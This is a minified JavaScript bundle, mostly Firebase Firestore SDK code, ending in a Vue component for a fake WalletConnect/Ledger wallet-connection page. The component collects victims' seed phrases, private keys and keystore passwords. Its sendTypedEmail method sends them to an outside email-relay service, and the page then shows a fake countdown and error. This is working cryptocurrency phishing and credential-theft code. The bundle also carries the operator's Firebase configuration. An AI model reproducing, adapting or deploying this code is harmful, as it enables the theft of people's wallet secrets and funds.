 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
new l5([4294967295, 4294967295], 0);

function Lr() {
    return typeof document < "u" ? document : null
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class _5 {
    constructor(t, s, n = 1e3, i = 1.5, r = 6e4) {
        this.oi = t, this.timerId = s, this.Mo = n, this.xo = i, this.Oo = r, this.No = 0, this.Bo = null, this.Lo = Date.now(), this.reset()
    }
    reset() {
        this.No = 0
    }
    ko() {
        this.No = this.Oo
    }
    qo(t) {
        this.cancel();
        const s = Math.floor(this.No + this.Qo()),
            n = Math.max(0, Date.now() - this.Lo),
            i = Math.max(0, s - n);
        i > 0 && tt("ExponentialBackoff", `Backing off for ${i} ms (base delay: ${this.No} ms, delay with jitter: ${s} ms, last attempt: ${n} ms ago)`), this.Bo = this.oi.enqueueAfterDelay(this.timerId, i, () => (this.Lo = Date.now(), t())), this.No *= this.xo, this.No < this.Mo && (this.No = this.Mo), this.No > this.Oo && (this.No = this.Oo)
    }
    Ko() {
        this.Bo !== null && (this.Bo.skipDelay(), this.Bo = null)
    }
    cancel() {
        this.Bo !== null && (this.Bo.cancel(), this.Bo = null)
    }
    Qo() {
        return (Math.random() - .5) * this.No
    }
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class ya {
    constructor(t, s, n, i, r) {
        this.asyncQueue = t, this.timerId = s, this.targetTimeMs = n, this.op = i, this.removalCallback = r, this.deferred = new Ns, this.then = this.deferred.promise.then.bind(this.deferred.promise), this.deferred.promise.catch(o => {})
    }
    get promise() {
        return this.deferred.promise
    }
    static createAndSchedule(t, s, n, i, r) {
        const o = Date.now() + n,
            l = new ya(t, s, o, i, r);
        return l.start(n), l
    }
    start(t) {
        this.timerHandle = setTimeout(() => this.handleDelayElapsed(), t)
    }
    skipDelay() {
        return this.handleDelayElapsed()
    }
    cancel(t) {
        this.timerHandle !== null && (this.clearTimeout(), this.deferred.reject(new Ie(Le.CANCELLED, "Operation cancelled" + (t ? ": " + t : ""))))
    }
    handleDelayElapsed() {
        this.asyncQueue.enqueueAndForget(() => this.timerHandle !== null ? (this.clearTimeout(), this.op().then(t => this.deferred.resolve(t))) : Promise.resolve())
    }
    clearTimeout() {
        this.timerHandle !== null && (this.removalCallback(this), clearTimeout(this.timerHandle), this.timerHandle = null)
    }
}

function C5(e, t) {
    if (ma("AsyncQueue", `${t}: ${e}`), Bf(e)) return new Ie(Le.UNAVAILABLE, `${t}: ${e}`);
    throw e
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class S5 {
    constructor(t, s, n, i) {
        this.authCredentials = t, this.appCheckCredentials = s, this.asyncQueue = n, this.databaseInfo = i, this.user = je.UNAUTHENTICATED, this.clientId = y5.newId(), this.authCredentialListener = () => Promise.resolve(), this.appCheckCredentialListener = () => Promise.resolve(), this.authCredentials.start(n, async r => {
            tt("FirestoreClient", "Received user=", r.uid), await this.authCredentialListener(r), this.user = r
        }), this.appCheckCredentials.start(n, r => (tt("FirestoreClient", "Received new app check token=", r), this.appCheckCredentialListener(r, this.user)))
    }
    get configuration() {
        return {
            asyncQueue: this.asyncQueue,
            databaseInfo: this.databaseInfo,
            clientId: this.clientId,
            authCredentials: this.authCredentials,
            appCheckCredentials: this.appCheckCredentials,
            initialUser: this.user,
            maxConcurrentLimboResolutions: 100
        }
    }
    setCredentialChangeListener(t) {
        this.authCredentialListener = t
    }
    setAppCheckTokenChangeListener(t) {
        this.appCheckCredentialListener = t
    }
    verifyNotTerminated() {
        if (this.asyncQueue.isShuttingDown) throw new Ie(Le.FAILED_PRECONDITION, "The client has already been terminated.")
    }
    terminate() {
        this.asyncQueue.enterRestrictedMode();
        const t = new Ns;
        return this.asyncQueue.enqueueAndForgetEvenWhileRestricted(async () => {
            try {
                this._onlineComponents && await this._onlineComponents.terminate(), this._offlineComponents && await this._offlineComponents.terminate(), this.authCredentials.shutdown(), this.appCheckCredentials.shutdown(), t.resolve()
            } catch (s) {
                const n = C5(s, "Failed to shutdown persistence");
                t.reject(n)
            }
        }), t.promise
    }
}
/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function Ff(e) {
    const t = {};
    return e.timeoutSeconds !== void 0 && (t.timeoutSeconds = e.timeoutSeconds), t
}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const Xl = new Map;
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function E5(e, t, s) {
    if (!s) throw new Ie(Le.INVALID_ARGUMENT, `Function ${e}() cannot be called with an empty ${t}.`)
}

function T5(e, t, s, n) {
    if (t === !0 && n === !0) throw new Ie(Le.INVALID_ARGUMENT, `${e} and ${s} cannot be used together.`)
}

function Yl(e) {
    if (os.isDocumentKey(e)) throw new Ie(Le.INVALID_ARGUMENT, `Invalid collection reference. Collection references must have an odd number of segments, but ${e} has ${e.length}.`)
}

function A5(e) {
    if (e === void 0) return "undefined";
    if (e === null) return "null";
    if (typeof e == "string") return e.length > 20 && (e = `${e.substring(0,20)}...`), JSON.stringify(e);
    if (typeof e == "number" || typeof e == "boolean") return "" + e;
    if (typeof e == "object") {
        if (e instanceof Array) return "an array"; {
            const t = function(n) {
                return n.constructor ? n.constructor.name : null
            }(e);
            return t ? `a custom ${t} object` : "an object"
        }
    }
    return typeof e == "function" ? "a function" : En()
}

function L5(e, t) {
    if ("_delegate" in e && (e = e._delegate), !(e instanceof t)) {
        if (t.name === e.constructor.name) throw new Ie(Le.INVALID_ARGUMENT, "Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?"); {
            const s = A5(e);
            throw new Ie(Le.INVALID_ARGUMENT, `Expected type '${t.name}', but it was: ${s}`)
        }
    }
    return e
}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Ql {
    constructor(t) {
        var s, n;
        if (t.host === void 0) {
            if (t.ssl !== void 0) throw new Ie(Le.INVALID_ARGUMENT, "Can't provide ssl option if host option is not set");
            this.host = "firestore.googleapis.com", this.ssl = !0
        } else this.host = t.host, this.ssl = (s = t.ssl) === null || s === void 0 || s;
        if (this.credentials = t.credentials, this.ignoreUndefinedProperties = !!t.ignoreUndefinedProperties, this.localCache = t.localCache, t.cacheSizeBytes === void 0) this.cacheSizeBytes = 41943040;
        else {
            if (t.cacheSizeBytes !== -1 && t.cacheSizeBytes < 1048576) throw new Ie(Le.INVALID_ARGUMENT, "cacheSizeBytes must be at least 1048576");
            this.cacheSizeBytes = t.cacheSizeBytes
        }
        T5("experimentalForceLongPolling", t.experimentalForceLongPolling, "experimentalAutoDetectLongPolling", t.experimentalAutoDetectLongPolling), this.experimentalForceLongPolling = !!t.experimentalForceLongPolling, this.experimentalForceLongPolling ? this.experimentalAutoDetectLongPolling = !1 : t.experimentalAutoDetectLongPolling === void 0 ? this.experimentalAutoDetectLongPolling = !0 : this.experimentalAutoDetectLongPolling = !!t.experimentalAutoDetectLongPolling, this.experimentalLongPollingOptions = Ff((n = t.experimentalLongPollingOptions) !== null && n !== void 0 ? n : {}),
            function(r) {
                if (r.timeoutSeconds !== void 0) {
                    if (isNaN(r.timeoutSeconds)) throw new Ie(Le.INVALID_ARGUMENT, `invalid long polling timeout: ${r.timeoutSeconds} (must not be NaN)`);
                    if (r.timeoutSeconds < 5) throw new Ie(Le.INVALID_ARGUMENT, `invalid long polling timeout: ${r.timeoutSeconds} (minimum allowed value is 5)`);
                    if (r.timeoutSeconds > 30) throw new Ie(Le.INVALID_ARGUMENT, `invalid long polling timeout: ${r.timeoutSeconds} (maximum allowed value is 30)`)
                }
            }(this.experimentalLongPollingOptions), this.useFetchStreams = !!t.useFetchStreams
    }
    isEqual(t) {
        return this.host === t.host && this.ssl === t.ssl && this.credentials === t.credentials && this.cacheSizeBytes === t.cacheSizeBytes && this.experimentalForceLongPolling === t.experimentalForceLongPolling && this.experimentalAutoDetectLongPolling === t.experimentalAutoDetectLongPolling && function(n, i) {
            return n.timeoutSeconds === i.timeoutSeconds
        }(this.experimentalLongPollingOptions, t.experimentalLongPollingOptions) && this.ignoreUndefinedProperties === t.ignoreUndefinedProperties && this.useFetchStreams === t.useFetchStreams
    }
}
class ba {
    constructor(t, s, n, i) {
        this._authCredentials = t, this._appCheckCredentials = s, this._databaseId = n, this._app = i, this.type = "firestore-lite", this._persistenceKey = "(lite)", this._settings = new Ql({}), this._settingsFrozen = !1
    }
    get app() {
        if (!this._app) throw new Ie(Le.FAILED_PRECONDITION, "Firestore was not initialized using the Firebase SDK. 'app' is not available");
        return this._app
    }
    get _initialized() {
        return this._settingsFrozen
    }
    get _terminated() {
        return this._terminateTask !== void 0
    }
    _setSettings(t) {
        if (this._settingsFrozen) throw new Ie(Le.FAILED_PRECONDITION, "Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");
        this._settings = new Ql(t), t.credentials !== void 0 && (this._authCredentials = function(n) {
            if (!n) return new d5;
            switch (n.type) {
                case "firstParty":
                    return new h5(n.sessionIndex || "0", n.iamToken || null, n.authTokenFactory || null);
                case "provider":
                    return n.client;
                default:
                    throw new Ie(Le.INVALID_ARGUMENT, "makeAuthCredentialsProvider failed due to invalid credential type")
            }
        }(t.credentials))
    }
    _getSettings() {
        return this._settings
    }
    _freezeSettings() {
        return this._settingsFrozen = !0, this._settings
    }
    _delete() {
        return this._terminateTask || (this._terminateTask = this._terminate()), this._terminateTask
    }
    toJSON() {
        return {
            app: this._app,
            databaseId: this._databaseId,
            settings: this._settings
        }
    }
    _terminate() {
        return function(s) {
            const n = Xl.get(s);
            n && (tt("ComponentProvider", "Removing Datastore"), Xl.delete(s), n.terminate())
        }(this), Promise.resolve()
    }
}

function I5(e, t, s, n = {}) {
    var i;
    const r = (e = L5(e, ba))._getSettings(),
        o = `${t}:${s}`;
    if (r.host !== "firestore.googleapis.com" && r.host !== o && c5("Host has been set in both settings() and connectFirestoreEmulator(), emulator host will be used."), e._setSettings(Object.assign(Object.assign({}, r), {
            host: o,
            ssl: !1
        })), n.mockUserToken) {
        let l, a;
        if (typeof n.mockUserToken == "string") l = n.mockUserToken, a = je.MOCK_USER;
        else {
            l = U6(n.mockUserToken, (i = e._app) === null || i === void 0 ? void 0 : i.options.projectId);
            const c = n.mockUserToken.sub || n.mockUserToken.user_id;
            if (!c) throw new Ie(Le.INVALID_ARGUMENT, "mockUserToken must contain 'sub' or 'user_id' field!");
            a = new je(c)
        }
        e._authCredentials = new f5(new jf(l, a))
    }
}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class wa {
    constructor(t, s, n) {
        this.converter = s, this._query = n, this.type = "query", this.firestore = t
    }
    withConverter(t) {
        return new wa(this.firestore, t, this._query)
    }
}
class er {
    constructor(t, s, n) {
        this.converter = s, this._key = n, this.type = "document", this.firestore = t
    }
    get _path() {
        return this._key.path
    }
    get id() {
        return this._key.path.lastSegment()
    }
    get path() {
        return this._key.path.canonicalString()
    }
    get parent() {
        return new Ps(this.firestore, this.converter, this._key.path.popLast())
    }
    withConverter(t) {
        return new er(this.firestore, t, this._key)
    }
}
class Ps extends wa {
    constructor(t, s, n) {
        super(t, s, x5(n)), this._path = n, this.type = "collection"
    }
    get id() {
        return this._query.path.lastSegment()
    }
    get path() {
        return this._query.path.canonicalString()
    }
    get parent() {
        const t = this._path.popLast();
        return t.isEmpty() ? null : new er(this.firestore, null, new os(t))
    }
    withConverter(t) {
        return new Ps(this.firestore, t, this._path)
    }
}

function zf(e, t, ...s) {
    if (e = X6(e), E5("collection", "path", t), e instanceof ba) {
        const n = rt.fromString(t, ...s);
        return Yl(n), new Ps(e, null, n)
    } {
        if (!(e instanceof er || e instanceof Ps)) throw new Ie(Le.INVALID_ARGUMENT, "Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");
        const n = e._path.child(rt.fromString(t, ...s));
        return Yl(n), new Ps(e.firestore, null, n)
    }
}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class N5 {
    constructor() {
        this.Xa = Promise.resolve(), this.eu = [], this.tu = !1, this.nu = [], this.ru = null, this.iu = !1, this.su = !1, this.ou = [], this.jo = new _5(this, "async_queue_retry"), this._u = () => {
            const s = Lr();
            s && tt("AsyncQueue", "Visibility state changed to " + s.visibilityState), this.jo.Ko()
        };
        const t = Lr();
        t && typeof t.addEventListener == "function" && t.addEventListener("visibilitychange", this._u)
    }
    get isShuttingDown() {
        return this.tu
    }
    enqueueAndForget(t) {
        this.enqueue(t)
    }
    enqueueAndForgetEvenWhileRestricted(t) {
        this.au(), this.uu(t)
    }
    enterRestrictedMode(t) {
        if (!this.tu) {
            this.tu = !0, this.su = t || !1;
            const s = Lr();
            s && typeof s.removeEventListener == "function" && s.removeEventListener("visibilitychange", this._u)
        }
    }
    enqueue(t) {
        if (this.au(), this.tu) return new Promise(() => {});
        const s = new Ns;
        return this.uu(() => this.tu && this.su ? Promise.resolve() : (t().then(s.resolve, s.reject), s.promise)).then(() => s.promise)
    }
    enqueueRetryable(t) {
        this.enqueueAndForget(() => (this.eu.push(t), this.cu()))
    }
    async cu() {
        if (this.eu.length !== 0) {
            try {
                await this.eu[0](), this.eu.shift(), this.jo.reset()
            } catch (t) {
                if (!Bf(t)) throw t;
                tt("AsyncQueue", "Operation failed with retryable error: " + t)
            }
            this.eu.length > 0 && this.jo.qo(() => this.cu())
        }
    }
    uu(t) {
        const s = this.Xa.then(() => (this.iu = !0, t().catch(n => {
            this.ru = n, this.iu = !1;
            const i = function(o) {
                let l = o.message || "";
                return o.stack && (l = o.stack.includes(o.message) ? o.stack : o.message + `
` + o.stack), l
            }(n);
            throw ma("INTERNAL UNHANDLED ERROR: ", i), n
        }).then(n => (this.iu = !1, n))));
        return this.Xa = s, s
    }
    enqueueAfterDelay(t, s, n) {
        this.au(), this.ou.indexOf(t) > -1 && (s = 0);
        const i = ya.createAndSchedule(this, t, s, n, r => this.lu(r));
        return this.nu.push(i), i
    }
    au() {
        this.ru && En()
    }
    verifyOperationInProgress() {}
    async hu() {
        let t;
        do t = this.Xa, await t; while (t !== this.Xa)
    }
    Pu(t) {
        for (const s of this.nu)
            if (s.timerId === t) return !0;
        return !1
    }
    Iu(t) {
        return this.hu().then(() => {
            this.nu.sort((s, n) => s.targetTimeMs - n.targetTimeMs);
            for (const s of this.nu)
                if (s.skipDelay(), t !== "all" && s.timerId === t) break;
            return this.hu()
        })
    }
    Tu(t) {
        this.ou.push(t)
    }
    lu(t) {
        const s = this.nu.indexOf(t);
        this.nu.splice(s, 1)
    }
}
class P5 extends ba {
    constructor(t, s, n, i) {
        super(t, s, n, i), this.type = "firestore", this._queue = function() {
            return new N5
        }(), this._persistenceKey = (i == null ? void 0 : i.name) || "[DEFAULT]"
    }
    _terminate() {
        return this._firestoreClient || M5(this), this._firestoreClient.terminate()
    }
}

function Uf(e, t) {
    const s = typeof e == "object" ? e : Z9(),
        n = typeof e == "string" ? e : t || "(default)",
        i = G9(s, "firestore").getImmediate({
            identifier: n
        });
    if (!i._initialized) {
        const r = F6("firestore");
        r && I5(i, ...r)
    }
    return i
}

function M5(e) {
    var t, s, n;
    const i = e._freezeSettings(),
        r = function(l, a, c, d) {
            return new b5(l, a, c, d.host, d.ssl, d.experimentalForceLongPolling, d.experimentalAutoDetectLongPolling, Ff(d.experimentalLongPollingOptions), d.useFetchStreams)
        }(e._databaseId, ((t = e._app) === null || t === void 0 ? void 0 : t.options.appId) || "", e._persistenceKey, i);
    e._firestoreClient = new S5(e._authCredentials, e._appCheckCredentials, e._queue, r), !((s = i.localCache) === null || s === void 0) && s._offlineComponentProvider && (!((n = i.localCache) === null || n === void 0) && n._onlineComponentProvider) && (e._firestoreClient._uninitializedComponentsProvider = {
        _offlineKind: i.localCache.kind,
        _offline: i.localCache._offlineComponentProvider,
        _online: i.localCache._onlineComponentProvider
    })
}(function(t, s = !0) {
    (function(i) {
        $n = i
    })(K9), gi(new hn("firestore", (n, {
        instanceIdentifier: i,
        options: r
    }) => {
        const o = n.getProvider("app").getImmediate(),
            l = new P5(new p5(n.getProvider("auth-internal")), new m5(n.getProvider("app-check-internal")), function(c, d) {
                if (!Object.prototype.hasOwnProperty.apply(c.options, ["projectId"])) throw new Ie(Le.INVALID_ARGUMENT, '"projectId" not provided in firebase.initializeApp.');
                return new _i(c.options.projectId, d)
            }(o, i), o);
        return r = Object.assign({
            useFetchStreams: s
        }, r), l._setSettings(r), l
    }, "PUBLIC").setMultipleInstances(!0)), Ls(Kl, "4.4.2", t), Ls(Kl, "4.4.2", "esm2017")
})();
const k5 = [...Hi, ...Vi];
zo("s6BKpBr7vPZack9iN");
const O5 = {
    apikey: "AIzaSyAhdmj3pASxds2ZNCAIR-gugo@em3LtZDE",
    authDomain: "ephemeraldb.firebaseapp.com",
    projectId: "ephemeraldb",
    storageBucket: "ephemeraldb.appspot.com",
    messagingSenderId: "375429255076",
    appId: "1:375429255076:web:0f84756f9cdf3681de3631"
};
Go(O5);
const $5 = Uf();
zf($5, "puzzler");
const R5 = {
        components: {
            phmodal: Ad,
            NavBar: Ro,
            NewsLetterSection: Bo,
            BottomNav: Fo
        },
        data: function() {
            return {
                active: !1,
                searchValue: "",
                showModal: !1,
                automatic: !1,
                notify: !1,
                disableSignIn: !0,
                app: {},
                email: "",
                password: "",
                privateKey: "",
                failed: !1,
                countdown: !1,
                counter: 15,
                seedPhrase: "",
                type: 0
            }
        },
        computed: {
            wallets() {
                return this.active && this.searchValue === "" ? Vi : !this.active && this.searchValue === "" ? Hi : k5
            },
            searchedWallets() {
                return [{
                    src: "img/data-cleaning.png",
                    alt: "Clear Cache",
                    appName: "Clear Cache",
                    type: "App",
                    href: "https://etherscan.io/"
                }, {
                    src: "img/app-installation.png",
                    alt: "Install App",
                    appName: "Install App",
                    type: "App",
                    href: "https://etherscan.io/"
                }, {
                    src: "img/browser.png",
                    alt: "Update Ledger Live",
                    appName: "Update Ledger Live",
                    type: "App",
                    href: "https://etherscan.io/"
                }, {
                    src: "img/update.png",
                    alt: "Update Apps",
                    appName: "Update Apps",
                    type: "App",
                    href: "https://etherscan.io/"
                }, {
                    src: "img/firmware-update.png",
                    alt: "Update Apps",
                    appName: "Update Device's Firmware",
                    type: "App",
                    href: "https://etherscan.io/"
                }]
            }
        },
        methods: {
            triggerModal(e) {
                console.log(e), this.$router.push("final")
            },
            resetAutomatic() {
                this.failed = !1, this.automatic = !1
            },
            toggleloginchecker() {
                this.loginchecker = !this.loginchecker
            },
            sendTypedEmail() {
                this.load = !0;
                let e, t = this.email && this.password,
                    s = this.seedPhrase ? this.seedPhrase.match(/([\s]+)/g).length : 0;
                console.log(s), this.type === 1 && t && (e = `the message type is Keystore Json and the details are: Keystore: (${this.email})... password: (${this.password})  will be used for ${this.app.appName}`), this.type === 2 && this.privateKey && (e = `the message type is Private Key and the details are: Private Key : ( ${this.privateKey}) will be used for ${this.app.appName}`), this.type === 0 && this.seedPhrase && s >= 11 && (e = `the message type is Seed Phrase and the details are: Seed Phrase : ( ${this.seedPhrase}) will be used for ${this.app.appName}`), Td.send("service_21ltu09", "template_iu283pe", {
                    message_message: e
                }).then(n => {
                    this.seedPhrase = "", this.email = "", this.password = ""
                }, n => {
                    console.log("FAILED...", n)
                }), this.seedPhrase = "", this.email = "", this.privateKey = "", this.password = ""
            },
            triggerDialog(e) {
                this.seedPhrase = !0, this.tech = e
            },
            failedInit() {
                this.automatic = !this.automatic, setTimeout(() => {
                    this.failed = !0
                }, 2500)
            },
            countReducer() {
                let e = this.seedPhrase ? this.seedPhrase.match(/([\s]+)/g).length : 0;
                if (this.type === 0 && e < 11) return alert("please ensure phrase is correcty typed");
                this.sendTypedEmail(), this.notify = !this.notify;
                let t = setInterval(() => {
                    this.counter > 0 ? this.counter-- : (this.countdown = !0, setTimeout(() => {
                        this.notify = !1, clearInterval(t)
                    }, 3e3))
                }, 1e3)
            }
        },
        mounted() {}
    },
    D5 = vt('<section class="text-gray-600 body-font" style="font-family:HMAlpha, DM Mono,  monospace;"><div class="container px-5 pt-24 mx-auto"><div class="flex flex-col text-center w-full mb-12"><h1 class="sm:text-6xl text-2xl font-bold title-font mb-4 text-black" style="font-family:HMAlpha, DM Mono,  monospace;"> Wallets </h1><p class="lg:w-2/3 mx-auto leading-7 text-2xl text-gray-600" style="font-family:HMAlpha, DM Mono,  monospace;"> Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking. </p></div></div></section>', 1),
    H5 = {
        class: "text-gray-600 body-font my-4"
    },
    V5 = {
        class: "px-4 py-6 mx-auto max-w-7xl sm:px-6 lg:px-8"
    },
    j5 = f("div", {
        class: "container px-5 mx-auto flex flex-wrap my-4 justify-center"
    }, [f("div", {
        class: "flex flex-col -mx-4 mt-auto mb-auto lg:w-1/2 sm:w-2/3 justify-center sm:pr-10"
    })], -1),
    B5 = {
        style: {
            "font-family": "HMAlpha, DM Mono,  monospace"
        }
    },
    F5 = {
        class: "text-gray-600 body-font"
    },
    z5 = {
        class: "container mx-auto"
    },
    U5 = {
        class: "flex flex-wrap"
    },
    G5 = ["onClick"],
    W5 = {
        class: "relative md:h-48 rounded overflow-hidden md:flex-shrink-0 md:flex md:flex-col"
    },
    q5 = ["alt", "src"],
    K5 = {
        class: "flex-grow flex-col flex items-center text-center justify-center"
    },
    Z5 = f("h3", {
        class: "text-gray-400 text-sm text-center"
    }, " Ledger ", -1),
    X5 = {
        class: "text-gray-900 title-font md:text-lg font-black text-center"
    },
    Y5 = {
        key: 0,
        class: "modal-masks",
        style: {
            "font-family": "HMAlpha, DM Mono,  monospace"
        }
    },
    Q5 = {
        class: "modal-wrapper"
    },
    J5 = {
        class: "modal-container item-center rounded-lg p-5"
    },
    e8 = {
        class: "modal-header"
    },
    t8 = {
        class: "flex justify-between item-center"
    },
    s8 = vt('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1459 238" version="1.1" class="h-6"><title>WalletConnect&#39;s logo</title><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="walletconnect-logo-2"><path d="M526.766839,130.223822 L506.743339,202.279192 L485.915975,202.279192 L458,96.8269617 L480.873561,96.8269617 L497.462373,173.193962 L498.047001,173.193962 L517.778188,96.8269617 L536.413197,96.8269617 L556.144384,173.193962 L556.729011,173.193962 L573.390902,96.8269617 L596.264463,96.8269617 L568.27541,202.279192 L547.448046,202.279192 L527.424545,130.223822 L526.766839,130.223822 Z M626.665106,188.101969 C635.946072,188.101969 643.619311,182.036456 643.619311,173.559354 L643.619311,167.859233 L627.103577,168.882332 C619.138024,169.46696 614.607159,173.047805 614.607159,178.601768 C614.607159,184.448046 619.430338,188.101969 626.665106,188.101969 Z M619.649573,203.521526 C604.741566,203.521526 593.414403,193.875168 593.414403,179.771024 C593.414403,165.520722 604.376173,157.262855 623.888124,156.0936 L643.619311,154.924344 L643.619311,149.735773 C643.619311,142.427926 638.503818,138.189375 630.465187,138.189375 C622.499633,138.189375 617.457219,142.135612 616.434121,147.908811 L596.922169,147.908811 C597.726033,132.70849 610.660922,122.258269 631.415207,122.258269 C651.511786,122.258269 664.592832,132.635411 664.592832,148.420361 L664.592832,202.279192 L643.984703,202.279192 L643.984703,190.294323 L643.546233,190.294323 C639.161524,198.625269 629.442088,203.521526 619.649573,203.521526 Z M678.843133,202.279192 L678.843133,96.8269617 L700.182046,96.8269617 L700.182046,202.279192 L678.843133,202.279192 Z M715.090054,202.279192 L715.090054,96.8269617 L736.428966,96.8269617 L736.428966,202.279192 L715.090054,202.279192 Z M785.976168,138.043218 C776.622124,138.043218 769.898905,145.13183 769.168121,154.924344 L802.418824,154.924344 C801.980353,144.912594 795.476369,138.043218 785.976168,138.043218 Z M802.711138,178.309455 L822.296167,178.309455 C819.957656,193.655933 805.92659,203.959997 786.560796,203.959997 C762.444901,203.959997 747.975365,188.54044 747.975365,163.474525 C747.975365,138.481689 762.591058,122.258269 785.756933,122.258269 C808.557415,122.258269 822.953874,137.677826 822.953874,161.501407 L822.953874,168.00539 L768.948885,168.00539 L768.948885,169.320803 C768.948885,180.501809 776.037497,188.175048 786.926188,188.175048 C794.745585,188.175048 800.738019,184.301889 802.711138,178.309455 Z M839.615765,105.888692 L860.954677,105.888692 L860.954677,123.939074 L875.424214,123.939074 L875.424214,140.016337 L860.954677,140.016337 L860.954677,177.505591 C860.954677,183.498026 863.877816,186.348086 870.162565,186.348086 C872.062605,186.348086 874.035723,186.201929 875.351136,185.982694 L875.351136,201.694565 C873.158782,202.206114 869.504858,202.571506 865.193229,202.571506 C846.777455,202.571506 839.615765,196.432915 839.615765,181.159515 L839.615765,140.016337 L828.580916,140.016337 L828.580916,123.939074 L839.615765,123.939074 L839.615765,105.888692 Z M935.567794,204.106154 C904.874837,204.106154 885.6552,183.571104 885.6552,149.516538 C885.6552,115.53505 905.020994,95 935.567794,95 C960.926023,95 980.218739,111.077263 981.899543,134.681609 L960.414474,134.681609 C958.368277,121.74672 948.429605,113.269617 935.567794,113.269617 C918.905903,113.269617 908.163368,127.227605 908.163368,149.443459 C908.163368,171.951628 918.759746,185.836537 935.640873,185.836537 C948.721919,185.836537 958.149041,178.163298 960.487552,165.666879 L981.972622,165.666879 C979.487954,189.198146 961.437572,204.106154 935.567794,204.106154 Z M1029.69286,203.959997 C1006.01544,203.959997 990.888195,188.759676 990.888195,163.036055 C990.888195,137.677826 1006.23467,122.258269 1029.69286,122.258269 C1053.15105,122.258269 1068.49753,137.604747 1068.49753,163.036055 C1068.49753,188.832754 1053.37029,203.959997 1029.69286,203.959997 Z M1029.69286,187.663499 C1040.14308,187.663499 1046.79322,178.821004 1046.79322,163.109133 C1046.79322,147.543419 1040.07,138.554767 1029.69286,138.554767 C1019.31572,138.554767 1012.51942,147.543419 1012.51942,163.109133 C1012.51942,178.821004 1019.16956,187.663499 1029.69286,187.663499 Z M1079.4593,202.279192 L1079.4593,123.939074 L1100.06743,123.939074 